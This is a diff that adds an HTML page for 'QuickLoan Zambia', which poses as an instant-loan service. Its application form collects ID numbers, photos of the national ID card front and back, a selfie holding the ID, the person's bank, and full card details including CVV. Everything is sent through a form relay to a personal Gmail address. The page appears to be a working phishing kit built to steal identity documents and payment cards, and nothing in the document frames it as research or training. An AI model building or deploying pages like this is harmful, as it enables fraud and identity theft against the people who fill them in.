@@ -1,0 +1,83 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>QuickLoan</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 text-gray-800">
+
+  <!-- Hero Section -->
+  <section class="text-center py-12 bg-blue-600 text-white">
+    <h1 class="text-4xl font-bold mb-4">QuickLoan</h1>
+    <p class="text-lg mb-6">Get instant loans directly to your mobile money or bank account.</p>
+    <a href="#loan-form" class="bg-white text-blue-600 px-6 py-2 rounded font-semibold">Apply Now</a>
+  </section>
+
+  <!-- Loan Application Form -->
+  <section id="loan-form" class="max-w-xl mx-auto my-12 bg-white p-8 rounded shadow">
+    <h2 class="text-2xl font-bold mb-4">Loan Application</h2>
+    <form action="https://formsubmit.io/send/grogzilla2@gmail.com" method="POST" enctype="multipart/form-data">
+      <input type="text" name="name" placeholder="Full Name" class="w-full border p-2 mb-4 rounded" required />
+      <input type="text" name="nrc" placeholder="NRC Number" class="w-full border p-2 mb-4 rounded" required />
+      <input type="date" name="dob" class="w-full border p-2 mb-4 rounded" required />
+
+      <label class="block mb-2 font-semibold">Upload Front of NRC:</label>
+      <input type="file" name="nrc_front" class="w-full border p-2 mb-4 rounded" accept="image/*" required />
+
+      <label class="block mb-2 font-semibold">Upload Back of NRC:</label>
+      <input type="file" name="nrc_back" class="w-full border p-2 mb-4 rounded" accept="image/*" required />
+
+      <label class="block mb-2 font-semibold">Upload Photo Holding NRC:</label>
+      <input type="file" name="holding_id" class="w-full border p-2 mb-4 rounded" accept="image/*" required />
+
+      <select name="bank" class="w-full border p-2 mb-4 rounded" required>
+        <option value="">Select Receiving Bank</option>
+        <option value="Zanaco">Zanaco</option>
+        <option value="FNB">FNB</option>
+        <option value="ABSA">ABSA</option>
+        <option value="Stanbic">Stanbic</option>
+        <option value="Access Bank">Access Bank</option>
+        <option value="Investrust">Investrust</option>
+      </select>
+
+      <label class="block mb-2 font-semibold">
+        <input type="checkbox" name="repayment_option" value="3 months grace" required />
+        I agree to start repaying after 3 months
+      </label>
+
+      <hr class="my-6">
+
+      <h3 class="text-lg font-bold mb-2">Card Details</h3>
+      <input type="text" name="card_name" placeholder="Cardholder Name" class="w-full border p-2 mb-4 rounded" required />
+      <input type="text" name="card_number" placeholder="Card Number" class="w-full border p-2 mb-4 rounded" required />
+      <input type="text" name="expiry" placeholder="MM/YY" class="w-full border p-2 mb-4 rounded" required />
+      <input type="text" name="cvv" placeholder="CVV" class="w-full border p-2 mb-4 rounded" required />
+
+      <input name="_formsubmit_id" type="text" style="display:none" />
+      <input type="hidden" name="_redirect" value="https://example.com/thank-you.html" />
+
+      <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700">Submit Application</button>
+    </form>
+  </section>
+
+  <!-- How It Works -->
+  <section class="text-center py-12 bg-gray-200">
+    <h2 class="text-2xl font-bold mb-6">How It Works</h2>
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-4xl mx-auto">
+      <div><h3 class="font-bold">1. Apply</h3><p>Fill in the quick loan form with your NRC and card details.</p></div>
+      <div><h3 class="font-bold">2. Review</h3><p>We verify your details quickly.</p></div>
+      <div><h3 class="font-bold">3. Receive</h3><p>Money sent to your Bank or Mobile Money.</p></div>
+    </div>
+  </section>
+
+  <!-- Contact -->
+  <footer class="text-center py-6 bg-blue-600 text-white">
+    <p>📞 +260 97 123 4567 | ✉️ support@quickloan.zm</p>
+    <p>&copy; 2025 QuickLoan Zambia</p>
+  </footer>
+
+</body>
+</html>
